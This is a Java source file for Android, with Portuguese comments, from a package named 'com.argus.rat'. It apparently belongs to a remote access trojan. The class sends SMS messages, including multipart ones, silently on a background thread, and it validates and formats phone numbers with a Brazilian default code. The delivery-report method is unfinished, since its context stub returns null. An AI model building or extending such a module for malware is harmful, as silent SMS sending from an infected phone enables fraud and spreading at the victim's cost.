package com.argus.rat;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsManager {
    private static final String TAG = "SmsManager";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    /**
     * Enviar SMS de forma assíncrona
     */
    public static void sendSms(String phoneNumber, String message) {
        executor.execute(() -> {
            try {
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                
                // Dividir mensagem longa em partes
                ArrayList<String> parts = smsManager.divideMessage(message);
                
                if (parts.size() > 1) {
                    smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
                } else {
                    smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                }
                
                Log.d(TAG, "SMS enviado para: " + phoneNumber);
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar SMS para: " + phoneNumber, e);
            }
        });
    }

    /**
     * Enviar SMS com confirmação de entrega
     */
    public static void sendSmsWithDeliveryReport(String phoneNumber, String message) {
        executor.execute(() -> {
            try {
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                
                android.app.PendingIntent sentIntent = android.app.PendingIntent.getBroadcast(
                    getContext(), 0, new Intent("SMS_SENT"), 
                    android.app.PendingIntent.FLAG_IMMUTABLE
                );
                
                android.app.PendingIntent deliveryIntent = android.app.PendingIntent.getBroadcast(
                    getContext(), 0, new Intent("SMS_DELIVERED"),
                    android.app.PendingIntent.FLAG_IMMUTABLE
                );
                
                smsManager.sendTextMessage(phoneNumber, null, message, sentIntent, deliveryIntent);
                Log.d(TAG, "SMS com confirmação enviado para: " + phoneNumber);
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar SMS com confirmação", e);
            }
        });
    }

    /**
     * Verificar se o número é válido
     */
    public static boolean isValidPhoneNumber(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.trim().isEmpty()) {
            return false;
        }
        
        // Remover caracteres não numéricos
        String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
        
        // Verificar comprimento mínimo
        return cleanNumber.length() >= 10 && cleanNumber.length() <= 15;
    }

    /**
     * Formatar número de telefone
     */
    public static String formatPhoneNumber(String phoneNumber) {
        if (phoneNumber == null) return "";
        
        String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
        
        // Adicionar código do país se necessário
        if (!cleanNumber.startsWith("+") && cleanNumber.length() == 10) {
            cleanNumber = "+55" + cleanNumber; // Brasil como padrão
        }
        
        return cleanNumber;
    }

    private static Context getContext() {
        // Método para obter contexto (será implementado posteriormente)
        return null;
    }
}